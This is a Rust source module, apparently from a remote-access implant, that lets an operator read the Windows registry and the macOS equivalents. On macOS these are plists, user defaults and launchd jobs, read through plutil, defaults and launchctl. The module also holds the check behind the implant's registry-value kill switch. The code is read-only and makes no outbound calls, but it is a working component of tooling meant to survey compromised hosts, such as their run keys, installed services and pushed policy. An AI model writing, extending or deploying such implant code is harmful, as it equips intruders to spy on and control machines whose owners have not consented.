//! The registry of the host.
//!
//! On Windows the registry is where the configuration lives, and it is
//! where an operator looks first: the run keys that start a program, the
//! services that are installed, the policy that is pushed.  Reading it is
//! plain Win32 through the FFI, so the implant takes no dependency for
//! it.
//!
//! macOS has no registry: the same settings live in the property lists,
//! in the defaults of the user and in the launchd domain.  The hives of
//! the operator keep their names there and point at the places that hold
//! the same thing, so the kill switch and the operator work the same way
//! on both systems.
//!
//! Every other platform answers "that is a Windows or macOS capability".

use crate::upk::Value;

/// The hives the operator asks for.
#[cfg(windows)]
fn hive_of(name: &str) -> Option<sys::HKEY> {
    match name.to_ascii_uppercase().as_str() {
        "HKLM" | "HKEY_LOCAL_MACHINE" => Some(sys::HKEY_LOCAL_MACHINE),
        "HKCU" | "HKEY_CURRENT_USER" => Some(sys::HKEY_CURRENT_USER),
        "HKCR" | "HKEY_CLASSES_ROOT" => Some(sys::HKEY_CLASSES_ROOT),
        "HKU" | "HKEY_USERS" => Some(sys::HKEY_USERS),
        _ => None,
    }
}

/// Read a key, or one value of a key.
///
/// Without a value name the key itself is described: its values and its
/// subkeys.  With one, the value is read.
#[cfg(windows)]
pub fn read(args: &Value) -> Result<String, String> {
    let hive_name = args.str_or("hive", "HKLM");
    let key_path = args.str_or("key", "");
    let value_name = args.str_or("value", "");
    if key_path.is_empty() {
        return Err("registry needs args.key".to_string());
    }
    let hive = hive_of(&hive_name).ok_or_else(|| format!("unknown hive {hive_name}"))?;
    let mut handle: sys::HKEY = std::ptr::null_mut();
    let subkey: Vec<u16> = key_path.encode_utf16().chain(std::iter::once(0)).collect();
    let status = unsafe {
        sys::RegOpenKeyExW(
            hive,
            subkey.as_ptr(),
            0,
            sys::KEY_READ,
            &mut handle,
        )
    };
    if status != 0 {
        return Err(format!("registry: {key_path} could not be opened ({status})"));
    }
    let out = unsafe {
        if value_name.is_empty() {
            describe(handle, &key_path)
        } else {
            read_value(handle, &value_name)
        }
    };
    unsafe { sys::RegCloseKey(handle) };
    out
}

/// Describe a key: its values and its subkeys.
#[cfg(windows)]
unsafe fn describe(handle: sys::HKEY, path: &str) -> Result<String, String> {
    let mut out = String::new();
    out.push_str(&format!("{path}\n"));

    // The values of the key.
    let mut index: u32 = 0;
    loop {
        let mut name: Vec<u16> = vec![0; 256];
        let mut length: u32 = name.len() as u32;
        let mut kind: u32 = 0;
        let mut size: u32 = 0;
        // The first call asks how much room the value needs.
        let status = sys::RegEnumValueW(
            handle,
            index,
            name.as_mut_ptr(),
            &mut length,
            std::ptr::null_mut(),
            &mut kind,
            std::ptr::null_mut(),
            &mut size,
        );
        if status != 0 {
            break;
        }
        let mut data: Vec<u8> = vec![0; size as usize];
        // The second one reads it.
        let mut length2: u32 = name.len() as u32;
        let mut size2: u32 = size;
        let status = sys::RegEnumValueW(
            handle,
            index,
            name.as_mut_ptr(),
            &mut length2,
            std::ptr::null_mut(),
            &mut kind,
            data.as_mut_ptr(),
            &mut size2,
        );
        if status != 0 {
            break;
        }
        let text = String::from_utf16_lossy(&name[..length2.saturating_sub(1) as usize]);
        out.push_str(&format!(
            "  value  {:<32} {}\n",
            text,
            decode(&data, kind)
        ));
        index += 1;
    }

    // The subkeys of the key.
    let mut index: u32 = 0;
    loop {
        let mut name: Vec<u16> = vec![0; 256];
        let mut length: u32 = name.len() as u32;
        let status = sys::RegEnumKeyExW(
            handle,
            index,
            name.as_mut_ptr(),
            &mut length,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );
        if status != 0 {
            break;
        }
        let text = String::from_utf16_lossy(&name[..length.saturating_sub(1) as usize]);
        out.push_str(&format!("  key    {text}\n"));
        index += 1;
    }
    Ok(out)
}

/// Read one value of a key.
#[cfg(windows)]
unsafe fn read_value(handle: sys::HKEY, name: &str) -> Result<String, String> {
    let value: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
    let mut kind: u32 = 0;
    let mut size: u32 = 0;
    let status = sys::RegQueryValueExW(
        handle,
        value.as_ptr(),
        std::ptr::null_mut(),
        &mut kind,
        std::ptr::null_mut(),
        &mut size,
    );
    if status != 0 {
        return Err(format!("registry: the value {name} is not there ({status})"));
    }
    let mut data: Vec<u8> = vec![0; size as usize];
    let status = sys::RegQueryValueExW(
        handle,
        value.as_ptr(),
        std::ptr::null_mut(),
        &mut kind,
        data.as_mut_ptr(),
        &mut size,
    );
    if status != 0 {
        return Err(format!("registry: the value {name} could not be read ({status})"));
    }
    Ok(format!("{name} = {}\n", decode(&data, kind)))
}

/// Turn the bytes of a value into something an operator can read.
#[cfg(windows)]
fn decode(data: &[u8], kind: u32) -> String {
    match kind {
        1 | 2 | 7 => {
            // REG_SZ, REG_EXPAND_SZ and REG_MULTI_SZ: UTF-16, and the
            // string ends at the first null.
            let mut words: Vec<u16> = Vec::new();
            for chunk in data.chunks_exact(2) {
                words.push(u16::from_le_bytes([chunk[0], chunk[1]]));
            }
            let text = String::from_utf16_lossy(&words);
            match text.find('\0') {
                Some(at) => text[..at].to_string(),
                None => text,
            }
        }
        4 => {
            // REG_DWORD
            if data.len() >= 4 {
                format!("{}", u32::from_le_bytes([data[0], data[1], data[2], data[3]]))
            } else {
                String::new()
            }
        }
        11 => {
            // REG_QWORD
            if data.len() >= 8 {
                let mut bytes = [0u8; 8];
                bytes.copy_from_slice(&data[..8]);
                format!("{}", u64::from_le_bytes(bytes))
            } else {
                String::new()
            }
        }
        _ => crate::config::hex_encode(data),
    }
}

/// The root of a hive on macOS.
///
/// The hives keep the names of Windows: they point at the places of the
/// system that hold the same thing.
#[cfg(target_os = "macos")]
fn hive_root(name: &str) -> Option<String> {
    match name.to_ascii_uppercase().as_str() {
        "HKLM" | "HKEY_LOCAL_MACHINE" => Some("/Library/Preferences".to_string()),
        "HKCU" | "HKEY_CURRENT_USER" => {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/".to_string());
            Some(format!("{home}/Library/Preferences"))
        }
        "HKCR" | "HKEY_CLASSES_ROOT" => Some("/Library/Application Support".to_string()),
        "HKU" | "HKEY_USERS" => Some("/Users".to_string()),
        _ => None,
    }
}

/// Read a key, or one value of a key.
///
/// On macOS a key is a property list, a domain of the defaults or a job
/// of the launchd domain.  A key that starts with a slash is a path, a
/// key that starts with "launchd:" is a job, and every other key is
/// looked for in the domain of the hive and then in the defaults.
#[cfg(target_os = "macos")]
pub fn read(args: &Value) -> Result<String, String> {
    let hive_name = args.str_or("hive", "HKCU");
    let key_path = args.str_or("key", "");
    let value_name = args.str_or("value", "");
    if key_path.is_empty() {
        return Err("registry needs args.key".to_string());
    }
    let root = hive_root(&hive_name).ok_or_else(|| format!("unknown hive {hive_name}"))?;

    // The launchd domain is not a file: it is a job the system runs.
    if let Some(target) = key_path.strip_prefix("launchd:") {
        return launchd_print(target);
    }

    let path = if key_path.starts_with('/') {
        std::path::PathBuf::from(&key_path)
    } else {
        std::path::PathBuf::from(&root).join(format!("{key_path}.plist"))
    };
    if !path.exists() {
        // A domain that has no file yet still has its defaults.
        return defaults_read(&key_path, &value_name);
    }
    if value_name.is_empty() {
        plutil_print(&path)
    } else {
        plutil_extract(&path, &value_name)
    }
}

/// The property list of a path, as the tool of the system prints it.
#[cfg(target_os = "macos")]
fn plutil_print(path: &std::path::Path) -> Result<String, String> {
    let out = std::process::Command::new("/usr/bin/plutil")
        .arg("-p")
        .arg(path)
        .output()
        .map_err(|e| format!("plutil: {e}"))?;
    if !out.status.success() {
        return Err(format!(
            "plutil: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

/// One value of a property list.
#[cfg(target_os = "macos")]
fn plutil_extract(path: &std::path::Path, value: &str) -> Result<String, String> {
    let out = std::process::Command::new("/usr/bin/plutil")
        .arg("-extract")
        .arg(value)
        .arg("raw")
        .arg(path)
        .output()
        .map_err(|e| format!("plutil: {e}"))?;
    if !out.status.success() {
        return Err(format!(
            "plutil: the value {value} is not there: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

/// The defaults of a domain of the user.
#[cfg(target_os = "macos")]
fn defaults_read(domain: &str, value: &str) -> Result<String, String> {
    let mut command = std::process::Command::new("/usr/bin/defaults");
    command.arg("read").arg(domain);
    if !value.is_empty() {
        command.arg(value);
    }
    let out = command.output().map_err(|e| format!("defaults: {e}"))?;
    if !out.status.success() {
        return Err(format!(
            "defaults: {domain} has no such value: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

/// A job of the launchd domain.
#[cfg(target_os = "macos")]
fn launchd_print(target: &str) -> Result<String, String> {
    let out = std::process::Command::new("/bin/launchctl")
        .arg("print")
        .arg(target)
        .output()
        .map_err(|e| format!("launchctl: {e}"))?;
    if !out.status.success() {
        return Err(format!(
            "launchctl: there is no job {target}: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

/// The registry is a Windows or macOS capability.
#[cfg(not(any(windows, target_os = "macos")))]
pub fn read(_args: &Value) -> Result<String, String> {
    Err("the registry is a Windows or macOS capability".to_string())
}

/// Does the registry value exist?
///
/// The kill switch watches for a value that appears: the operator writes
/// it on a machine they no longer want the implant on, and the next
/// check-in of the implant is its last one.
#[cfg(windows)]
pub fn exists(hive_name: &str, key_path: &str, value_name: &str) -> bool {
    let hive = match hive_of(hive_name) {
        Some(hive) => hive,
        None => return false,
    };
    let mut handle: sys::HKEY = std::ptr::null_mut();
    let subkey: Vec<u16> = key_path.encode_utf16().chain(std::iter::once(0)).collect();
    let status = unsafe {
        sys::RegOpenKeyExW(hive, subkey.as_ptr(), 0, sys::KEY_READ, &mut handle)
    };
    if status != 0 {
        return false;
    }
    let name: Vec<u16> = value_name.encode_utf16().chain(std::iter::once(0)).collect();
    let mut kind: u32 = 0;
    let mut size: u32 = 0;
    // The first call only asks whether the value is there.
    let found = unsafe {
        sys::RegQueryValueExW(
            handle,
            name.as_ptr(),
            std::ptr::null_mut(),
            &mut kind,
            std::ptr::null_mut(),
            &mut size,
        )
    };
    unsafe { sys::RegCloseKey(handle) };
    found == 0
}

/// Does the registry value exist?
///
/// The kill switch watches for a value that appears: the operator writes
/// it on a machine they no longer want the implant on, and the next
/// check-in of the implant is its last one.
#[cfg(target_os = "macos")]
pub fn exists(hive_name: &str, key_path: &str, value_name: &str) -> bool {
    if key_path.is_empty() {
        return false;
    }
    let root = match hive_root(hive_name) {
        Some(root) => root,
        None => return false,
    };
    // The launchd domain is not a file: it is a job the system runs.
    if let Some(target) = key_path.strip_prefix("launchd:") {
        return std::process::Command::new("/bin/launchctl")
            .arg("print")
            .arg(target)
            .output()
            .map(|out| out.status.success())
            .unwrap_or(false);
    }
    let path = if key_path.starts_with('/') {
        std::path::PathBuf::from(key_path)
    } else {
        std::path::PathBuf::from(root).join(format!("{key_path}.plist"))
    };
    if !path.exists() {
        // The defaults of a domain that has no file yet.
        return defaults_read(key_path, value_name).is_ok();
    }
    if value_name.is_empty() {
        return true;
    }
    plutil_extract(&path, value_name).is_ok()
}

/// The registry is a Windows or macOS capability.
#[cfg(not(any(windows, target_os = "macos")))]
pub fn exists(_hive_name: &str, _key_path: &str, _value_name: &str) -> bool {
    false
}

#[cfg(windows)]
mod sys {
    use std::os::raw::c_void;

    pub type HKEY = *mut c_void;
    pub type DWORD = u32;
    pub type LSTATUS = i32;

    pub const KEY_READ: DWORD = 0x20019;
    pub const HKEY_LOCAL_MACHINE: HKEY = 0x8000_0002u32 as HKEY;
    pub const HKEY_CURRENT_USER: HKEY = 0x8000_0001u32 as HKEY;
    pub const HKEY_CLASSES_ROOT: HKEY = 0x8000_0000u32 as HKEY;
    pub const HKEY_USERS: HKEY = 0x8000_0003u32 as HKEY;

    #[link(name = "advapi32")]
    extern "system" {
        pub fn RegOpenKeyExW(
            hkey: HKEY,
            subkey: *const u16,
            options: DWORD,
            sam: DWORD,
            result: *mut HKEY,
        ) -> LSTATUS;
        pub fn RegQueryValueExW(
            hkey: HKEY,
            name: *const u16,
            reserved: *mut DWORD,
            kind: *mut DWORD,
            data: *mut u8,
            size: *mut DWORD,
        ) -> LSTATUS;
        pub fn RegEnumValueW(
            hkey: HKEY,
            index: DWORD,
            name: *mut u16,
            name_len: *mut DWORD,
            reserved: *mut DWORD,
            kind: *mut DWORD,
            data: *mut u8,
            data_size: *mut DWORD,
        ) -> LSTATUS;
        pub fn RegEnumKeyExW(
            hkey: HKEY,
            index: DWORD,
            name: *mut u16,
            name_len: *mut DWORD,
            reserved: *mut DWORD,
            class: *mut DWORD,
            options: *mut DWORD,
            last: *mut i64,
        ) -> LSTATUS;
        pub fn RegCloseKey(hkey: HKEY) -> LSTATUS;
    }
}
